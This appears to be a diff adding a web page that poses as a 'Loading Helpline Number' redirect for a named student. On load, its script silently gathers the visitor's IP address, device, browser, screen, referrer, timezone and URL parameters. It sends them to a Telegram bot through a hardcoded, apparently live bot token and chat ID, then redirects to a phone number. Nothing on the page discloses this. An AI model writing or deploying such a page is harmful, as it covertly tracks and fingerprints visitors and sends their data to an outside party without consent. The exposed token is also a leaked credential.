@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect</title>
+    <style>
+        /* Material Design Styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .loader-container {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .loading-text {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: #3f51b5;
+        }
+
+        /* Loader Circle */
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3f51b5;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Animation for the loader */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="loading-text" id="dynamic-message">Loading Helpline Number...</div>
+        <div class="loader"></div>
+    </div>
+
+    <script>
+        // Function to safely escape special characters for Telegram
+        function escapeHTML(text) {
+            return text
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#39;");
+        }
+
+        // Function to detect device model and name from the user agent
+        function getDeviceDetails() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            let deviceName = "Unknown Device";
+            let deviceModel = "Unknown Model";
+
+            if (/iphone|ipod/.test(userAgent)) {
+                deviceName = "iPhone";
+                deviceModel = userAgent.match(/iphone\s?(\d+)/i) ? "iPhone " + userAgent.match(/iphone\s?(\d+)/i)[1] : "iPhone";
+            } else if (/android/.test(userAgent)) {
+                deviceName = "Android";
+                deviceModel = userAgent.match(/android\s?([\d.]+)/i) ? "Android " + userAgent.match(/android\s?([\d.]+)/i)[1] : "Android Device";
+            } else if (/windows phone/.test(userAgent)) {
+                deviceName = "Windows Phone";
+                deviceModel = "Windows Phone";
+            } else if (/macintosh|mac os x/.test(userAgent)) {
+                deviceName = "Mac";
+                deviceModel = "Macintosh";
+            } else if (/windows/.test(userAgent)) {
+                deviceName = "Windows PC";
+                deviceModel = "Windows";
+            }
+
+            return { deviceName, deviceModel };
+        }
+
+        // Function to extract global URL parameters
+        function getURLParams(url) {
+            let params = {};
+            let queryString = url.split('?')[1]; // Get the part after '?'
+            
+            if (queryString) {
+                queryString.split('&').forEach(param => {
+                    let [key, value] = param.split('=');
+                    params[decodeURIComponent(key)] = decodeURIComponent(value || '');
+                });
+            }
+            
+            return params;
+        }
+
+        // Function to collect details and send them to Telegram
+        async function logAndSendToTelegram() {
+            try {
+                // Extract URL parameters
+                const params = getURLParams(window.location.href);
+                const studentName = params.studentName || 'Student'; // Get studentName from the URL
+
+                // Display dynamic message with studentName
+                document.getElementById('dynamic-message').innerText = `${studentName}, don't hesitate to call us!`;
+
+                // Collect critical details
+                const ipAddress = await fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => data.ip)
+                    .catch(() => "Unknown IP"); // Handle failure
+
+                const deviceDetails = getDeviceDetails();
+                const browser = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const referringURL = document.referrer || "Direct Visit";
+                const redirectionURL = "TELEPHONE";
+                const language = navigator.language || 'en-US';
+                const platform = navigator.platform || 'Unknown Platform';
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown Timezone';
+                const urlParams = JSON.stringify(params, null, 2);
+
+                // Escape all data for Telegram
+                const message = `
+    <b>User Details:</b>
+    📌 <b>IP Address:</b> ${escapeHTML(ipAddress)}
+    🌐 <b>Browser:</b> ${escapeHTML(browser)}
+    📏 <b>Screen Resolution:</b> ${escapeHTML(screenResolution)}
+    🔗 <b>Referring URL:</b> ${escapeHTML(referringURL)}
+    📱 <b>Device Name:</b> ${escapeHTML(deviceDetails.deviceName)}
+    📲 <b>Device Model:</b> ${escapeHTML(deviceDetails.deviceModel)}
+    🗣 <b>Language:</b> ${escapeHTML(language)}
+    💻 <b>Platform:</b> ${escapeHTML(platform)}
+    ⏰ <b>Timezone:</b> ${escapeHTML(timezone)}
+    🔀 <b>URL Parameters:</b> <pre>${escapeHTML(urlParams)}</pre>
+
+    ➡️ <b>Redirecting to:</b> <a href="${redirectionURL}">${redirectionURL}</a>
+    `;
+
+                // Send details to Telegram bot
+                const botToken = '7576592014:AAFpVPWMY0SD3_qdw6omo_tQo4jGmHu_K9Y';
+                const chatId = '6128322651';
+                const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                await fetch(telegramAPI, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "HTML" // **Uses HTML format instead of Markdown**
+                    }),
+                }).catch(error => console.error("Telegram Error:", error));
+
+            } catch (error) {
+                console.error("Error logging details:", error);
+            }
+
+            // Ensure user is redirected after 1 second
+            setTimeout(() => {
+                const redirectionURL = "tel://+916114359170";
+                window.location.href = redirectionURL;
+            }, 0);
+        }
+
+        // Execute function when page loads
+        window.onload = logAndSendToTelegram;
+    </script>
+</body>
+</html>
